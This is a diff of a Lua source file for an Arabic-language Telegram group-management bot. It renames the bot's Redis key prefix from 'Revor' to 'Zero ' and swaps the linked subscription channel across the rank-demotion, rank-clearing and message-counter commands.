 return LuaTele.sendText(msg_chat_id,msg_id,"\n*⌔︙لا يمكن تنزيل رتبه نفس رتبتك ولا اعلى من رتبتك *","md",true)  
 end
-Redis:srem(Revor.."Revor:Managers:Group"..msg_chat_id, Message_Reply.sender.user_id)
-Redis:srem(Revor.."Revor:Addictive:Group"..msg_chat_id, Message_Reply.sender.user_id)
-Redis:srem(Revor.."Revor:Distinguished:Group"..msg_chat_id, Message_Reply.sender.user_id)
+Redis:srem(Zero .."Zero :Managers:Group"..msg_chat_id, Message_Reply.sender.user_id)
+Redis:srem(Zero .."Zero :Addictive:Group"..msg_chat_id, Message_Reply.sender.user_id)
+Redis:srem(Zero .."Zero :Distinguished:Group"..msg_chat_id, Message_Reply.sender.user_id)
 elseif msg.Managers then
 if Rink == 5 or Rink < 5 then
 return LuaTele.sendText(msg_chat_id,msg_id,"\n*⌔︙لا يمكن تنزيل رتبه نفس رتبتك ولا اعلى من رتبتك *","md",true)  
 end
-Redis:srem(Revor.."Revor:Addictive:Group"..msg_chat_id, Message_Reply.sender.user_id)
-Redis:srem(Revor.."Revor:Distinguished:Group"..msg_chat_id, Message_Reply.sender.user_id)
+Redis:srem(Zero .."Zero :Addictive:Group"..msg_chat_id, Message_Reply.sender.user_id)
+Redis:srem(Zero .."Zero :Distinguished:Group"..msg_chat_id, Message_Reply.sender.user_id)
 elseif msg.Addictive then
 if Rink == 6 or Rink < 6 then
 return LuaTele.sendText(msg_chat_id,msg_id,"\n*⌔︙لا يمكن تنزيل رتبه نفس رتبتك ولا اعلى من رتبتك *","md",true)  
 end
-Redis:srem(Revor.."Revor:Distinguished:Group"..msg_chat_id, Message_Reply.sender.user_id)
+Redis:srem(Zero .."Zero :Distinguished:Group"..msg_chat_id, Message_Reply.sender.user_id)
 end
 return LuaTele.sendText(msg_chat_id,msg_id,"\n*⌔︙تم تنزيل الشخص من الرتب التاليه { "..dev..""..crr..""..cr..""..own..""..mod..""..vip.." *}","md",true)  
 end
@@ -7756,7 +7759,7 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
 local UserId_Info = LuaTele.searchPublicChat(UserName)
@@ -7769,32 +7772,32 @@ end
 if UserName and UserName:match('(%S+)[Bb][Oo][Tt]') then
 return LuaTele.sendText(msg_chat_id,msg_id,"\n⌔︙عذرآ لا تستطيع استخدام معرف البوت ","md",true)  
 end
-if Redis:sismember(Revor.."Revor:Developers:Groups",UserId_Info.id) then
+if Redis:sismember(Zero .."Zero :Developers:Groups",UserId_Info.id) then
 dev = "المطور ،" else dev = "" end
-if Redis:sismember(Revor.."Revor:TheBasics:Group"..msg_chat_id, UserId_Info.id) then
+if Redis:sismember(Zero .."Zero :TheBasics:Group"..msg_chat_id, UserId_Info.id) then
 crr = "منشئ اساسي ،" else crr = "" end
-if Redis:sismember(Revor..'Revor:Originators:Group'..msg_chat_id, UserId_Info.id) then
+if Redis:sismember(Zero ..'Zero :Originators:Group'..msg_chat_id, UserId_Info.id) then
 cr = "منشئ ،" else cr = "" end
-if Redis:sismember(Revor..'Revor:Managers:Group'..msg_chat_id, UserId_Info.id) then
+if Redis:sismember(Zero ..'Zero :Managers:Group'..msg_chat_id, UserId_Info.id) then
 own = "مدير ،" else own = "" end
-if Redis:sismember(Revor..'Revor:Addictive:Group'..msg_chat_id, UserId_Info.id) then
+if Redis:sismember(Zero ..'Zero :Addictive:Group'..msg_chat_id, UserId_Info.id) then
 mod = "ادمن ،" else mod = "" end
-if Redis:sismember(Revor..'Revor:Distinguished:Group'..msg_chat_id, UserId_Info.id) then
+if Redis:sismember(Zero ..'Zero :Distinguished:Group'..msg_chat_id, UserId_Info.id) then
 vip = "مميز ،" else vip = ""
 end
 if The_ControllerAll(UserId_Info.id) == true then
 Rink = 1
-elseif Redis:sismember(Revor.."Revor:Developers:Groups",UserId_Info.id)  then
+elseif Redis:sismember(Zero .."Zero :Developers:Groups",UserId_Info.id)  then
 Rink = 2
-elseif Redis:sismember(Revor.."Revor:TheBasics:Group"..msg_chat_id, UserId_Info.id) then
+elseif Redis:sismember(Zero .."Zero :TheBasics:Group"..msg_chat_id, UserId_Info.id) then
 Rink = 3
-elseif Redis:sismember(Revor.."Revor:Originators:Group"..msg_chat_id, UserId_Info.id) then
+elseif Redis:sismember(Zero .."Zero :Originators:Group"..msg_chat_id, UserId_Info.id) then
 Rink = 4
-elseif Redis:sismember(Revor.."Revor:Managers:Group"..msg_chat_id, UserId_Info.id) then
+elseif Redis:sismember(Zero .."Zero :Managers:Group"..msg_chat_id, UserId_Info.id) then
 Rink = 5
-elseif Redis:sismember(Revor.."Revor:Addictive:Group"..msg_chat_id, UserId_Info.id) then
+elseif Redis:sismember(Zero .."Zero :Addictive:Group"..msg_chat_id, UserId_Info.id) then
 Rink = 6
-elseif Redis:sismember(Revor.."Revor:Distinguished:Group"..msg_chat_id, UserId_Info.id) then
+elseif Redis:sismember(Zero .."Zero :Distinguished:Group"..msg_chat_id, UserId_Info.id) then
 Rink = 7
 else
 Rink = 8
@@ -7806,47 +7809,47 @@ if msg.ControllerBot then
 if Rink == 1 or Rink < 1 then
 return LuaTele.sendText(msg_chat_id,msg_id,"\n*⌔︙لا يمكن تنزيل رتبه نفس رتبتك ولا اعلى من رتبتك *","md",true)  
 end
-Redis:srem(Revor.."Revor:Developers:Groups",UserId_Info.id)
-Redis:srem(Revor.."Revor:TheBasics:Group"..msg_chat_id, UserId_Info.id)
-Redis:srem(Revor.."Revor:Originators:Group"..msg_chat_id, UserId_Info.id)
-Redis:srem(Revor.."Revor:Managers:Group"..msg_chat_id, UserId_Info.id)
-Redis:srem(Revor.."Revor:Addictive:Group"..msg_chat_id, UserId_Info.id)
-Redis:srem(Revor.."Revor:Distinguished:Group"..msg_chat_id, UserId_Info.id)
+Redis:srem(Zero .."Zero :Developers:Groups",UserId_Info.id)
+Redis:srem(Zero .."Zero :TheBasics:Group"..msg_chat_id, UserId_Info.id)
+Redis:srem(Zero .."Zero :Originators:Group"..msg_chat_id, UserId_Info.id)
+Redis:srem(Zero .."Zero :Managers:Group"..msg_chat_id, UserId_Info.id)
+Redis:srem(Zero .."Zero :Addictive:Group"..msg_chat_id, UserId_Info.id)
+Redis:srem(Zero .."Zero :Distinguished:Group"..msg_chat_id, UserId_Info.id)
 elseif msg.Developers then
 if Rink == 2 or Rink < 2 then
 return LuaTele.sendText(msg_chat_id,msg_id,"\n*⌔︙لا يمكن تنزيل رتبه نفس رتبتك ولا اعلى من رتبتك *","md",true)  
 end
-Redis:srem(Revor.."Revor:TheBasics:Group"..msg_chat_id, UserId_Info.id)
-Redis:srem(Revor.."Revor:Originators:Group"..msg_chat_id, UserId_Info.id)
-Redis:srem(Revor.."Revor:Managers:Group"..msg_chat_id, UserId_Info.id)
-Redis:srem(Revor.."Revor:Addictive:Group"..msg_chat_id, UserId_Info.id)
-Redis:srem(Revor.."Revor:Distinguished:Group"..msg_chat_id, UserId_Info.id)
+Redis:srem(Zero .."Zero :TheBasics:Group"..msg_chat_id, UserId_Info.id)
+Redis:srem(Zero .."Zero :Originators:Group"..msg_chat_id, UserId_Info.id)
+Redis:srem(Zero .."Zero :Managers:Group"..msg_chat_id, UserId_Info.id)
+Redis:srem(Zero .."Zero :Addictive:Group"..msg_chat_id, UserId_Info.id)
+Redis:srem(Zero .."Zero :Distinguished:Group"..msg_chat_id, UserId_Info.id)
 elseif msg.TheBasics then
 if Rink == 3 or Rink < 3 then
 return LuaTele.sendText(msg_chat_id,msg_id,"\n*⌔︙لا يمكن تنزيل رتبه نفس رتبتك ولا اعلى من رتبتك *","md",true)  
 end
-Redis:srem(Revor.."Revor:Originators:Group"..msg_chat_id, UserId_Info.id)
-Redis:srem(Revor.."Revor:Managers:Group"..msg_chat_id, UserId_Info.id)
-Redis:srem(Revor.."Revor:Addictive:Group"..msg_chat_id, UserId_Info.id)
-Redis:srem(Revor.."Revor:Distinguished:Group"..msg_chat_id, UserId_Info.id)
+Redis:srem(Zero .."Zero :Originators:Group"..msg_chat_id, UserId_Info.id)
+Redis:srem(Zero .."Zero :Managers:Group"..msg_chat_id, UserId_Info.id)
+Redis:srem(Zero .."Zero :Addictive:Group"..msg_chat_id, UserId_Info.id)
+Redis:srem(Zero .."Zero :Distinguished:Group"..msg_chat_id, UserId_Info.id)
 elseif msg.Originators then
 if Rink == 4 or Rink < 4 then
 return LuaTele.sendText(msg_chat_id,msg_id,"\n*⌔︙لا يمكن تنزيل رتبه نفس رتبتك ولا اعلى من رتبتك *","md",true)  
 end
-Redis:srem(Revor.."Revor:Managers:Group"..msg_chat_id, UserId_Info.id)
-Redis:srem(Revor.."Revor:Addictive:Group"..msg_chat_id, UserId_Info.id)
-Redis:srem(Revor.."Revor:Distinguished:Group"..msg_chat_id, UserId_Info.id)
+Redis:srem(Zero .."Zero :Managers:Group"..msg_chat_id, UserId_Info.id)
+Redis:srem(Zero .."Zero :Addictive:Group"..msg_chat_id, UserId_Info.id)
+Redis:srem(Zero .."Zero :Distinguished:Group"..msg_chat_id, UserId_Info.id)
 elseif msg.Managers then
 if Rink == 5 or Rink < 5 then
 return LuaTele.sendText(msg_chat_id,msg_id,"\n*⌔︙لا يمكن تنزيل رتبه نفس رتبتك ولا اعلى من رتبتك *","md",true)  
 end
-Redis:srem(Revor.."Revor:Addictive:Group"..msg_chat_id, UserId_Info.id)
-Redis:srem(Revor.."Revor:Distinguished:Group"..msg_chat_id, UserId_Info.id)
+Redis:srem(Zero .."Zero :Addictive:Group"..msg_chat_id, UserId_Info.id)
+Redis:srem(Zero .."Zero :Distinguished:Group"..msg_chat_id, UserId_Info.id)
 elseif msg.Addictive then
 if Rink == 6 or Rink < 6 then
 return LuaTele.sendText(msg_chat_id,msg_id,"\n*⌔︙لا يمكن تنزيل رتبه نفس رتبتك ولا اعلى من رتبتك *","md",true)  
 end
-Redis:srem(Revor.."Revor:Distinguished:Group"..msg_chat_id, UserId_Info.id)
+Redis:srem(Zero .."Zero :Distinguished:Group"..msg_chat_id, UserId_Info.id)
 end
 return LuaTele.sendText(msg_chat_id,msg_id,"\n*⌔︙تم تنزيل الشخص من الرتب التاليه { "..dev..""..crr..""..cr..""..own..""..mod..""..vip.." *}","md",true)  
 end
@@ -7857,7 +7860,7 @@ if not msg.TheBasics then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(4)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
 if msg.can_be_deleted_for_all_users == false then
@@ -7888,7 +7891,7 @@ if not msg.TheBasics then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(4)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
 if msg.can_be_deleted_for_all_users == false then
@@ -7920,7 +7923,7 @@ if not msg.TheBasics then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(4)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
 if msg.can_be_deleted_for_all_users == false then
@@ -7957,7 +7960,7 @@ if not msg.TheBasics then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(4)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
 if msg.can_be_deleted_for_all_users == false then
@@ -7996,7 +7999,7 @@ if not msg.TheBasics then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(4)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
 if msg.can_be_deleted_for_all_users == false then
@@ -8028,7 +8031,7 @@ if not msg.TheBasics then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(4)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
 if msg.can_be_deleted_for_all_users == false then
@@ -8057,23 +8060,23 @@ end
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"⌔︙تم تنزيله من المشرفين ").Reply,"md",true)  
 end 
 if text == 'مسح رسائلي' then
-Redis:del(Revor..'Revor:Num:Message:User'..msg.chat_id..':'..msg.sender.user_id)
+Redis:del(Zero ..'Zero :Num:Message:User'..msg.chat_id..':'..msg.sender.user_id)
 LuaTele.sendText(msg_chat_id,msg_id,'⌔︙تم مسح جميع رسائلك ',"md",true)  
 elseif text == 'مسح سحكاتي' or text == 'مسح تعديلاتي' then
-Redis:del(Revor..'Revor:Num:Message:Edit'..msg.chat_id..':'..msg.sender.user_id)
+Redis:del(Zero ..'Zero :Num:Message:Edit'..msg.chat_id..':'..msg.sender.user_id)
 LuaTele.sendText(msg_chat_id,msg_id,'⌔︙تم مسح جميع تعديلاتك ',"md",true)  
 elseif text == 'مسح جهاتي' then
-Redis:del(Revor..'Revor:Num:Add:Memp'..msg.chat_id..':'..msg.sender.user_id)
+Redis:del(Zero ..'Zero :Num:Add:Memp'..msg.chat_id..':'..msg.sender.user_id)
 LuaTele.sendText(msg_chat_id,msg_id,'⌔︙تم مسح جميع جهاتك المضافه ',"md",true)  
 elseif text == 'رسائلي' then
-LuaTele.sendText(msg_chat_id,msg_id,'⌔︙عدد رسائلك هنا *~ '..(Redis:get(Revor..'Revor:Num:Message:User'..msg.chat_id..':'..msg.sender.user_id) or 1)..'*',"md",true)  
+LuaTele.sendText(msg_chat_id,msg_id,'⌔︙عدد رسائلك هنا *~ '..(Redis:get(Zero ..'Zero :Num:Message:User'..msg.chat_id..':'..msg.sender.user_id) or 1)..'*',"md",true)  
 elseif text == 'سحكاتي' or text == 'تعديلاتي' then
-LuaTele.sendText(msg_chat_id,msg_id,'⌔︙عدد التعديلات هنا *~ '..(Redis:get(Revor..'Revor:Num:Message:Edit'..msg.chat_id..msg.sender.user_id) or 0)..'*',"md",true)  
+LuaTele.sendText(msg_chat_id,msg_id,'⌔︙عدد التعديلات هنا *~ '..(Redis:get(Zero ..'Zero :Num:Message:Edit'..msg.chat_id..msg.sender.user_id) or 0)..'*',"md",true)  
 elseif text == 'جهاتي' then
-LuaTele.sendText(msg_chat_id,msg_id,'⌔︙عدد جهاتك المضافه هنا *~ '..(Redis:get(Revor.."Revor:Num:Add:Memp"..msg.chat_id..":"..msg.sender.user_id) or 0)..'*',"md",true)  
+LuaTele.sendText(msg_chat_id,msg_id,'⌔︙عدد جهاتك المضافه هنا *~ '..(Redis:get(Zero .."Zero :Num:Add:Memp"..msg.chat_id..":"..msg.sender.user_id) or 0)..'*',"md",true)  
 elseif text == 'مسح' and msg.reply_to_message_id ~= 0 and msg.Addictive then
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
 if GetInfoBot(msg).Delmsg == false then
@@ -8087,10 +8090,10 @@ if not msg.ControllerBot then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(1)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:setex(Revor.."Revor:Redis:Id:Groups"..msg.chat_id..""..msg.sender.user_id,240,true)  
+Redis:setex(Zero .."Zero :Redis:Id:Groups"..msg.chat_id..""..msg.sender.user_id,240,true)  
 return LuaTele.sendText(msg_chat_id,msg_id,[[
 ⌔︙ارسل الان النص
 ⌔︙يمكنك اضافه :
@@ -8111,10 +8114,10 @@ if not msg.ControllerBot then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(1)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:del(Revor.."Revor:Set:Id:Groups")
+Redis:del(Zero .."Zero :Set:Id:Groups")
 return LuaTele.sendText(msg_chat_id,msg_id, '⌔︙تم ازالة كليشة الايدي العامه',"md",true)  
 end
 
@@ -8123,10 +8126,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:setex(Revor.."Revor:Redis:Id:Group"..msg.chat_id..""..msg.sender.user_id,240,true)  
+Redis:setex(Zero .."Zero :Redis:Id:Group"..msg.chat_id..""..msg.sender.user_id,240,true)  
 return LuaTele.sendText(msg_chat_id,msg_id,[[
 ⌔︙ارسل الان النص
 ⌔︙يمكنك اضافه :
@@ -8147,10 +8150,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:del(Revor.."Revor:Set:Id:Group"..msg.chat_id)
+Redis:del(Zero .."Zero :Set:Id:Group"..msg.chat_id)
 return LuaTele.sendText(msg_chat_id,msg_id, '⌔︙تم ازالة كليشة الايدي ',"md",true)  
 end
 
@@ -8161,14 +8164,14 @@ if not msg.ControllerBot then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(1)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-local Info_Members = Redis:smembers(Revor.."Revor:DevelopersQ:Groups") 
+local Info_Members = Redis:smembers(Zero .."Zero :DevelopersQ:Groups") 
 if #Info_Members == 0 then
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙لا يوجد مطورين ثانوين حاليا , ","md",true)  
 end
-Redis:del(Revor.."Revor:DevelopersQ:Groups") 
+Redis:del(Zero .."Zero :DevelopersQ:Groups") 
 return LuaTele.sendText(msg_chat_id,msg_id,"*⌔︙تم مسح {"..#Info_Members.."} من المطورين الثانويين*","md",true)
 end
 if TextMsg == 'المطورين' then
@@ -8176,14 +8179,14 @@ if not msg.DevelopersQ then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(2)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-local Info_Members = Redis:smembers(Revor.."Revor:Developers:Groups") 
+local Info_Members = Redis:smembers(Zero .."Zero :Developers:Groups") 
 if #Info_Members == 0 then
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙لا يوجد مطورين حاليا , ","md",true)  
 end
-Redis:del(Revor.."Revor:Developers:Groups") 
+Redis:del(Zero .."Zero :Developers:Groups") 
 return LuaTele.sendText(msg_chat_id,msg_id,"*⌔︙تم مسح {"..#Info_Members.."} من المطورين *","md",true)
 end
 if TextMsg == 'المنشئين الاساسيين' then
@@ -8191,14 +8194,14 @@ if not msg.TheBasicsm then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(44)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-local Info_Members = Redis:smembers(Revor.."Revor:TheBasics:Group"..msg_chat_id) 
+local Info_Members = Redis:smembers(Zero .."Zero :TheBasics:Group"..msg_chat_id) 
 if #Info_Members == 0 then
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙لا يوجد منشئين اساسيين حاليا , ","md",true)  
 end
-Redis:del(Revor.."Revor:TheBasics:Group"..msg_chat_id) 
+Redis:del(Zero .."Zero :TheBasics:Group"..msg_chat_id) 
 return LuaTele.sendText(msg_chat_id,msg_id,"*⌔︙تم مسح {"..#Info_Members.."} من المنشؤين الاساسيين *","md",true)
 end
 if TextMsg == 'المالكين' then
@@ -8206,14 +8209,14 @@ if not msg.Developers then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(3)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-local Info_Members = Redis:smembers(Revor.."Revor:TheBasics:Group"..msg_chat_id) 
+local Info_Members = Redis:smembers(Zero .."Zero :TheBasics:Group"..msg_chat_id) 
 if #Info_Members == 0 then
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙لا يوجد مالكين حاليا , ","md",true)  
 end
-Redis:del(Revor.."Revor:TheBasics:Group"..msg_chat_id) 
+Redis:del(Zero .."Zero :TheBasics:Group"..msg_chat_id) 
 return LuaTele.sendText(msg_chat_id,msg_id,"*⌔︙تم مسح {"..#Info_Members.."} من المالكين *","md",true)
 end
 if TextMsg == 'المنشئين' then
@@ -8221,14 +8224,14 @@ if not msg.TheBasics then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(4)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-local Info_Members = Redis:smembers(Revor.."Revor:Originators:Group"..msg_chat_id) 
+local Info_Members = Redis:smembers(Zero .."Zero :Originators:Group"..msg_chat_id) 
 if #Info_Members == 0 then
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙لا يوجد منشئين حاليا , ","md",true)  
 end
-Redis:del(Revor.."Revor:Originators:Group"..msg_chat_id) 
+Redis:del(Zero .."Zero :Originators:Group"..msg_chat_id) 
 return LuaTele.sendText(msg_chat_id,msg_id,"*⌔︙تم مسح {"..#Info_Members.."} من المنشئين *","md",true)
 end
 if TextMsg == 'المدراء' then
@@ -8236,14 +8239,14 @@ if not msg.Originators then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(5)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-local Info_Members = Redis:smembers(Revor.."Revor:Managers:Group"..msg_chat_id) 
+local Info_Members = Redis:smembers(Zero .."Zero :Managers:Group"..msg_chat_id) 
 if #Info_Members == 0 then
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙لا يوجد مدراء حاليا , ","md",true)  
 end
-Redis:del(Revor.."Revor:Managers:Group"..msg_chat_id) 
+Redis:del(Zero .."Zero :Managers:Group"..msg_chat_id) 
 return LuaTele.sendText(msg_chat_id,msg_id,"*⌔︙تم مسح {"..#Info_Members.."} من المدراء *","md",true)
 end
